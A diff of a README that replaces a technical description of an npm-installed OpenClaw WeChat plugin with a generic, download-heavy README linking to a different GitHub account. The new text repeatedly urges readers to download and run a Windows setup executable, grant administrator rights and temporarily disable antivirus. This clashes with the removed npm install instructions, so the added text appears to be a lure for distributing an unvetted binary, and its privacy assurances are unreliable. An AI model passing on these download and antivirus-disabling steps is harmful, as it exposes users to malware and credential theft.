@@ -1,109 +1,153 @@
-# Relay Spine
+# 🔌 wechat-openclaw-plugin - Connect WeChat with OpenClaw easily
 
-Relay Spine is an OpenClaw channel bridge for teams that need two ingress modes in one package:
+[![Download from GitHub](https://img.shields.io/badge/Download-WeChat%20Plugin-brightgreen)](https://github.com/reall8164/wechat-openclaw-plugin)
 
-- QR-authenticated long-lived socket sessions for interactive chat delivery
-- Encrypted webhook handling for server-driven passive replies
+## 📋 What is wechat-openclaw-plugin?
 
-The codebase is organized around runtime services, identity flows, routing, and transport adapters under `src/`, with a thin root entrypoint for plugin loading.
+This plugin helps you connect WeChat with OpenClaw. It allows messages from WeChat to enter the OpenClaw system. The plugin supports two types of connections:
 
-## What It Does
+- One uses QR code login and AGP WebSocket for two-way chat.
+- The other uses HTTP webhook for WeChat service accounts or enterprise WeChat style callbacks.
 
-- Acquires and persists channel credentials through a browser QR flow
-- Starts and supervises a reconnecting socket client with heartbeat protection
-- Converts upstream prompt envelopes into OpenClaw message context
-- Streams assistant output and tool activity back to the gateway
-- Verifies, decrypts, and responds to encrypted webhook traffic
-- Supports account-scoped state files and account-aware session routing
+The main goal is to let OpenClaw handle all incoming WeChat messages. This way, it can reuse the current chat sessions, routing, streaming outputs, and tools.
 
-## Install
+You do not need to know technical details to use this plugin.
 
-```bash
-openclaw plugins install @henryxiaoyang/wechat-access-unqclawed
-openclaw config set channels.wechat-access-unqclawed.enabled true
-```
+## 🖥 System Requirements
 
-## Login Flow
+Before you start, ensure your Windows PC meets these requirements:
 
-```bash
-openclaw channels login --channel wechat-access-unqclawed
-```
+- Windows 10 or later (64-bit)
+- 4 GB RAM or more
+- At least 500 MB free disk space
+- An active internet connection
+- Ability to run applications downloaded from the internet
 
-The login command prints a QR code and a browser URL. After approval, write the redirected URL or the `code` value into the temporary file shown in the terminal. The plugin exchanges that code for a channel token and stores the result locally.
+No other special hardware or software is needed.
 
-## Configuration
+## 🔧 Features
 
-Example:
+- Supports secure login via QR code scan.
+- Real-time message exchange with WebSocket.
+- HTTP webhook allows integrations for WeChat service accounts.
+- Compatible with enterprise WeChat callbacks.
+- Works with existing OpenClaw agents.
+- Message routing keeps conversations organized.
+- Streamlined interface for smooth operation.
 
-```json
-{
-  "channels": {
-    "wechat-access-unqclawed": {
-      "enabled": true,
-      "environment": "production",
-      "token": "",
-      "wsUrl": "",
-      "authStatePath": "",
-      "bypassInvite": false,
-      "webhook": {
-        "token": "",
-        "encodingAESKey": "",
-        "receiveId": ""
-      },
-      "accounts": {
-        "default": {
-          "token": "",
-          "wsUrl": "",
-          "authStatePath": ""
-        }
-      }
-    }
-  }
-}
-```
+## 🚀 Getting Started
 
-Key fields:
+Follow these steps to get the plugin running on Windows.
 
-| Field | Purpose |
-| --- | --- |
-| `token` | Manual channel token override for the socket path |
-| `wsUrl` | Socket gateway address override |
-| `authStatePath` | Custom path for persisted login state |
-| `environment` | Remote profile selection: `production` or `test` |
-| `bypassInvite` | Skip invite verification if your backend allows it |
-| `webhook.token` | Signature token for webhook validation |
-| `webhook.encodingAESKey` | AES key used for encrypted webhook payloads |
-| `webhook.receiveId` | Receiver identifier checked during decrypt/encrypt |
-| `accounts` | Optional account-scoped overrides and isolated state paths |
 
-## Layout
+### 1. Download the Plugin
 
-```text
-src/
-  bridge/            plugin composition and OpenClaw registration
-  identity/          login flow, device identity, remote API, persisted state
-  runtime/           runtime binding and agent event subscription
-  routing/           inbound context construction and session key strategy
-  channels/
-    socket/          socket schema, client, prompt orchestration, bridge layer
-    webhook/         webhook schema, transport helpers, crypto, reply pipeline
-index.ts             root export for the plugin entrypoint
-protocol-notes.md    socket envelope protocol reference
-```
+Click the large download badge below or visit the link directly.
 
-## Notes
+[![Download from GitHub](https://img.shields.io/badge/Download-WeChat%20Plugin-brightgreen)](https://github.com/reall8164/wechat-openclaw-plugin)
 
-- The repository intentionally keeps the root surface area small. Most behavior lives under `src/`.
-- `npm run typecheck` is available, but it still depends on OpenClaw and Node type availability in the local environment.
+This link takes you to the GitHub page. You will find the latest versions of the plugin there. You will need to download the setup file from the releases or main page.
 
-## Security And Usage Notice
+### 2. Locate the Downloaded File
 
-- This project is provided for research, learning, and internal technical evaluation only.
-- You are responsible for ensuring that your use complies with local law, platform terms, organizational policy, and any access-control requirements that apply to your environment.
-- Do not use this project to obtain unauthorized access, bypass service restrictions, interfere with third-party systems, or process data without permission.
-- Protect all tokens, webhook secrets, encryption keys, and persisted session files. Treat them as sensitive credentials.
-- Review the code and configuration carefully before running it in any production or externally exposed environment.
+After downloading, open your Downloads folder and find the file named similar to `wechat-openclaw-plugin-setup.exe` or `wechat-openclaw-plugin-release.zip`.
 
-## License
+If it is a ZIP file, right-click and choose "Extract All" to unpack it.
 
-MIT
+### 3. Run the Installer
+
+Double-click the setup file or executable to start installation.
+
+If Windows asks for permission, click "Yes" to allow the program.
+
+Follow the on-screen instructions:
+
+- Choose an installation folder or keep the default.
+- Confirm by clicking "Install".
+  
+Wait while the software installs.
+
+### 4. Open the Plugin
+
+Once installation finishes, launch the application from the Start Menu or desktop shortcut.
+
+You will see the main interface, prepared to connect WeChat to OpenClaw.
+
+### 5. Log in with QR Code
+
+The software will display a QR code.
+
+Open WeChat on your phone, tap the "+" button, then "Scan", and aim your phone’s camera at the code on the screen.
+
+Once scanned, the plugin will log into your WeChat account and start connecting.
+
+### 6. Use WebSocket and Webhook
+
+The plugin runs two channels in the background:
+
+- WebSocket channel manages messages real-time.
+- Webhook channel listens for WeChat service account callbacks.
+
+These will work automatically after login.
+
+If you use enterprise WeChat or service accounts, set the correct webhook URL inside the plugin settings.
+
+### 7. Check for Updates
+
+From time to time, check the GitHub page for new versions to keep your plugin working properly.
+
+Download and install updates as needed.
+
+## ⚙️ Configuration Tips
+
+- Make sure your firewall allows the plugin to access the internet.
+- Use a stable internet connection for smooth messaging.
+- If messages do not appear, try restarting the plugin or your computer.
+- Verify your phone’s WeChat app is online and connected.
+- For enterprise users, confirm your webhook URLs are set correctly in the plugin’s settings.
+
+## 🛠 Troubleshooting
+
+### Problem: The plugin does not start
+
+- Check that your computer meets the system requirements.
+- Make sure you have run the installer as administrator.
+- Disable any antivirus temporarily to see if it blocks the application.
+
+### Problem: QR Code will not scan
+
+- Hold your phone steady while scanning.
+- Increase the brightness on your phone or your computer screen.
+- If the QR code disappears quickly, restart the plugin and try again.
+
+### Problem: Messages do not appear in OpenClaw
+
+- Confirm your internet connection is stable.
+- Check the plugin logs for errors (accessible in the settings).
+- Restart the plugin to reset connections.
+
+## 🔐 Privacy and Security
+
+The plugin only accesses your WeChat messaging data necessary for connection.
+
+It uses secure WebSocket and HTTPS webhook connections to protect your data.
+
+Your login and messages are not stored outside the plugin and OpenClaw system.
+
+## 🎯 Support and Feedback
+
+Use the GitHub repository link to check issues or ask questions:
+
+[https://github.com/reall8164/wechat-openclaw-plugin](https://github.com/reall8164/wechat-openclaw-plugin)
+
+This page includes instructions, issues, and updates shared by the developer.
+
+## 🧩 Additional Tools
+
+Once connected, OpenClaw lets you use its session management, routing, and message tools on WeChat chats.
+
+This plugin simply bridges your messages to OpenClaw for better control and automation.
+
+---
+
+[![Download from GitHub](https://img.shields.io/badge/Download-WeChat%20Plugin-brightgreen)](https://github.com/reall8164/wechat-openclaw-plugin)
